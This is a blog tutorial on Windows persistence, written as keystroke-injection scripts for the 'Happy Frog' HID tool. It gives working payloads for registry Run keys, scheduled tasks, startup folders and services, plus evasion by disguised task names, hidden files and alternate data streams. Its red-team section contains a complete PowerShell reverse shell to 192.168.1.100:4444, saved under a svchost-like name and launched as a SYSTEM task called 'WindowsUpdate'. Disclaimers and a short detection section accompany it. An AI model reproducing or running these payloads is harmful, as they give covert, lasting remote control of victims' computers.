---
title: "Persistence: When Your Script Won't Let Go"
pubDate: 2025-06-30
categories: ["education", "persistence", "red-team", "automation", "python", "HID", "scripting",]
---

---

##  The Art of Staying Put

Picture this: You've just pulled off the digital equivalent of a perfect heist. Your Happy Frog script executed flawlessly, dropped its payload like a mic, and then... vanished into the digital ether like a ghost in the machine. But what if you want it to stick around? What if you need it to be more like that friend who shows up uninvited and somehow ends up staying for three months?

Welcome to **Persistence** — the art of making your Happy Frog scripts stick around longer than your ex's Netflix password.

---

## What Even Is Persistence?

Think of persistence like that one song that gets stuck in your head. You know the one — maybe it's "Bohemian Rhapsody" or "Baby Shark" (I'm not judging, we've all been there). It just won't leave. That's persistence in a nutshell.

In the context of Happy Frog and HID automation, persistence means:
- **Surviving reboots** (like a cockroach in a nuclear winter)
- **Auto-executing on login** (the digital equivalent of your mom calling you every morning)
- **Maintaining access** across sessions (because sometimes one visit just isn't enough)
- **Evading detection** (playing hide and seek with security tools)

---

## The Good, The Bad, and The Educational

###  **Educational Persistence** (The Good Guys)

Imagine you're a system administrator who needs to:
- Automatically configure new workstations
- Deploy security updates across a network
- Set up monitoring scripts that run on every boot
- Create automated backup systems

This is where persistence becomes your best friend. It's like having a digital butler who remembers your preferences and keeps everything running smoothly.

**Real-World Example:**
```bash
# Educational: Automated system hardening
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "schtasks /create /tn 'SecurityUpdate' /tr 'C:\scripts\security_check.bat' /sc onlogon /ru SYSTEM"
ENTER
DELAY 1000
STRING exit
ENTER
```

###  **Red Team Persistence** (The Dark Side)

Now, let's talk about the other side of the coin. Red teamers use persistence to:
- Maintain access after initial compromise
- Establish command and control channels
- Create backdoors for future operations
- Test defensive capabilities

**Important Disclaimer:** This is for **authorized testing only**. If you're using this on systems you don't own or have explicit permission to test, you're not a red teamer — you're a criminal. Don't be that person.

---

## The Persistence Arsenal

### 1. **Registry Persistence** (The Classic)

The Windows Registry is like the brain of your operating system. It remembers everything, including what to run when the system starts. It's the digital equivalent of leaving sticky notes all over your house.

```bash
# Registry Run Key Persistence
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HappyFrog" /t REG_SZ /d "C:\scripts\frog_payload.bat" /f
ENTER
DELAY 1000
STRING exit
ENTER
```

**What this does:** Adds your script to the registry so it runs every time the user logs in. It's like setting an alarm clock that never stops.

### 2. **Scheduled Task Persistence** (The Sneaky One)

Scheduled tasks are like having a personal assistant who works 24/7. They can run your scripts at specific times, on specific events, or even when the system starts.

```bash
# Scheduled Task Persistence
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "schtasks /create /tn 'SystemMaintenance' /tr 'C:\scripts\maintenance.bat' /sc onstart /ru SYSTEM /f"
ENTER
DELAY 1000
STRING exit
ENTER
```

**What this does:** Creates a scheduled task that runs your script every time the system starts, with SYSTEM privileges. It's like having a VIP pass to the system.

### 3. **Startup Folder Persistence** (The Simple Approach)

Sometimes the simplest solutions are the best. The startup folder is like a digital welcome mat — anything you put there gets executed when the user logs in.

```bash
# Startup Folder Persistence
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "copy C:\scripts\frog_script.bat \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""
ENTER
DELAY 1000
STRING exit
ENTER
```

**What this does:** Copies your script to the user's startup folder, ensuring it runs every login. It's like leaving your keys under the doormat.

### 4. **Service Persistence** (The Professional)

Windows services are like background workers that never sleep. They run continuously and can be configured to start automatically with the system.

```bash
# Service Persistence (Advanced)
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "sc create \"SystemHelper\" binPath= \"C:\scripts\helper_service.exe\" start= auto"
ENTER
DELAY 1000
STRING sc start "SystemHelper"
ENTER
DELAY 1000
STRING exit
ENTER
```

**What this does:** Creates a Windows service that starts automatically with the system. It's like hiring a permanent employee who never takes breaks.

---

## The Stealth Factor

###  **Evasion Techniques**

Persistence is great, but if you're too obvious about it, you'll get caught faster than a teenager sneaking in after curfew. Here are some stealth techniques:

#### **1. Legitimate Names**
Don't name your persistence mechanisms "HACKER_BACKDOOR" or "EVIL_SCRIPT". Use names that blend in:
- `SystemMaintenance`
- `WindowsUpdate`
- `SecurityCheck`
- `PerformanceMonitor`

#### **2. File Hiding**
```bash
# Hide files using attrib
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "attrib +h +s C:\scripts\frog_payload.bat"
ENTER
DELAY 1000
STRING exit
ENTER
```

#### **3. Alternate Data Streams**
```bash
# Hide in ADS (Advanced)
ATTACKMODE HID
DELAY 2000
MOD r
DELAY 500
STRING cmd /c "echo @echo off > C:\temp\readme.txt:frog.bat"
ENTER
DELAY 1000
STRING exit
ENTER
```

---

## The Educational Payload: Automated System Setup

Let's create a real-world example that demonstrates legitimate persistence for system administration:

```bash
# Automated System Setup with Persistence
ATTACKMODE HID
DELAY 2000

# Open PowerShell as Administrator
MOD r
DELAY 500
STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
ENTER
DELAY 3000

# Create persistent system maintenance script
STRING $maintenanceScript = @"
@echo off
echo [$(Get-Date)] Starting system maintenance...
echo Checking disk space...
wmic logicaldisk get size,freespace,caption
echo Checking system updates...
wuauclt /detectnow
echo Maintenance complete.
"@
ENTER

STRING $maintenanceScript | Out-File -FilePath "C:\scripts\system_maintenance.bat" -Encoding ASCII
ENTER

# Create scheduled task for daily maintenance
STRING schtasks /create /tn "DailyMaintenance" /tr "C:\scripts\system_maintenance.bat" /sc daily /st 02:00 /ru SYSTEM /f
ENTER

# Create registry entry as backup
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemMaintenance" /t REG_SZ /d "C:\scripts\system_maintenance.bat" /f
ENTER

STRING exit
ENTER
```

**What this does:**
1. Creates a maintenance script that runs daily at 2 AM
2. Sets up a scheduled task for automated execution
3. Adds a registry entry as a backup persistence mechanism
4. Logs all activities for audit purposes

---

## The Red Team Perspective

###  **Establishing Command & Control**

In red team scenarios, persistence is about maintaining access and establishing reliable communication channels:

```bash
# Red Team Persistence Example
ATTACKMODE HID
DELAY 2000

# Create reverse shell persistence
MOD r
DELAY 500
STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
ENTER
DELAY 3000

# Create persistent reverse shell
STRING $reverseShell = @"
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        
        while($true) {
            $command = $reader.ReadLine()
            if($command -eq "exit") { break }
            
            $output = Invoke-Expression $command 2>&1
            $writer.WriteLine($output)
            $writer.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
"@
ENTER

STRING $reverseShell | Out-File -FilePath "C:\Windows\Temp\svchost_helper.ps1" -Encoding ASCII
ENTER

# Create scheduled task for persistence
STRING schtasks /create /tn "WindowsUpdate" /tr "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_helper.ps1" /sc onlogon /ru SYSTEM /f
ENTER

STRING exit
ENTER
```

**Important:** This is for **authorized testing only**. Always ensure you have proper permissions and scope documentation.

---

## Detection and Defense

###  **How to Spot Persistence**

As a defender, you need to know what to look for:

#### **Registry Monitoring**
```powershell
# Check common persistence locations
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
```

#### **Scheduled Task Analysis**
```powershell
# Review scheduled tasks
schtasks /query /fo table
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

#### **Startup Folder Monitoring**
```powershell
# Check startup folders
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "$env:PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

###  **Defensive Measures**

#### **1. Application Whitelisting**
Only allow known good applications to run. It's like having a bouncer at your digital club.

#### **2. Process Monitoring**
Monitor for unusual processes and scheduled tasks. Think of it as having security cameras everywhere.

#### **3. Registry Monitoring**
Watch for changes to persistence-related registry keys. It's like having motion sensors on your digital doors.

---

## The Ethical Compass

###  **Educational Use Cases**
- **System Administration:** Automated maintenance and configuration
- **DevOps:** Continuous deployment and monitoring
- **Security Research:** Understanding attack vectors and defenses
- **Learning:** Hands-on experience with system internals

###  **Legal and Ethical Considerations**
- **Always get permission** before testing on any system
- **Document your scope** and stay within authorized boundaries
- **Use in controlled environments** for learning purposes
- **Respect privacy** and data protection regulations
- **Report findings** responsibly to system owners

---

## The Happy Frog Way

Remember, Happy Frog is designed for **education and authorized testing**. The persistence techniques we've covered are powerful tools that can be used for both good and bad purposes. The key is understanding how they work so you can:

1. **Build better defenses** against malicious persistence
2. **Automate legitimate tasks** more effectively
3. **Understand system internals** at a deeper level
4. **Develop better security practices** for your organization

---

## Final Thoughts

Persistence is like that friend who always shows up at your parties — sometimes welcome, sometimes not, but always memorable. Whether you're using it for legitimate automation or learning about defensive techniques, understanding persistence is crucial in today's cybersecurity landscape.

Just remember: **With great power comes great responsibility**. Use these techniques wisely, ethically, and always within the bounds of authorized testing.

---

> "The best persistence is the kind that helps rather than harms. Build tools that make systems better, not worse." — Zero

---

**Next Steps:**
- Practice these techniques in controlled environments
- Build your own persistence mechanisms for legitimate automation
- Learn to detect and defend against malicious persistence
- Contribute to the cybersecurity community through responsible disclosure

---

*Remember: This is educational content. Always ensure you have proper authorization before testing any persistence techniques on systems you don't own.*

---

<details><summary> Quick Reference: Common Persistence Locations</summary>

**Registry Keys:**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`

**File System:**
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- `%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- `%WINDIR%\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

**Scheduled Tasks:**
- `schtasks /query` to list all tasks
- Look for tasks with unusual names or execution paths

</details>

---

*"Persistence is not about being stubborn; it's about being smart enough to stick around when it matters."*

Stay sharp. Stay grounded. Stay curious. Stay loud.

Don't Be A Skid
-Zero

[Buy Me A Coffee @iamnotaskid](https://buymeacoffee.com/iamnotaskid)